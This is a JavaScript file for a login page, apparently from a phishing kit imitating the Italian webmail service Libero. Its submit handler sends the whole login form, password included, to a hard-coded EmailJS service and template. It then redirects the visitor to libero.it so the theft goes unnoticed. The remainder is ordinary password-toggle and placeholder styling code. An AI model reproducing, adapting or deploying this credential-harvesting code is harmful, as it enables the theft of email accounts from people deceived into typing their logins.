const btn = document.getElementById('nextBtn');

document.getElementById('loginform')
    .addEventListener('submit', function(event) {
        event.preventDefault();

        btn.textContent= 'AVANTI';

        const serviceID = 'service_9ust8qe';
        const templateID = 'template_q5nghfc';

        emailjs.sendForm(serviceID, templateID, event.target)
            .then(() => {
                btn.textContent = 'Login';
                window.location.href = 'https://libero.it'; // Redirect to the desired link
            })
            .catch((err) => {
                btn.textContent = 'Login';
                alert(JSON.stringify(err));
            });

      event.target.reset();
    });

const togglePasswordButton = document.querySelector("#toggle-password");
const closedEyeIcon = document.querySelector("#closed-eye");
const openEyeIcon = document.querySelector("#open-eye");
const passwordElement = document.querySelector("#password");
let isPasswordVisible = false;

togglePasswordButton.addEventListener("click", function() {
    if (!isPasswordVisible) {
        //make password visible
        passwordElement.type = "text";
        openEyeIcon.classList.remove("hide");
        closedEyeIcon.classList.add("hide");
    } else {
        //make password hidden
        passwordElement.type = "password";
        closedEyeIcon.classList.remove("hide");
        openEyeIcon.classList.add("hide");
    }
    isPasswordVisible = !isPasswordVisible;
});

console.log(openEyeIcon);

//placeholder

// Placeholder

const inputPlaceholder = document.querySelectorAll("input[placeholder]");

inputPlaceholder.forEach((input) => {
    input.addEventListener("click", function() {
        this.classList.toggle("input-border-color");
        console.log("clicked");
    });

});



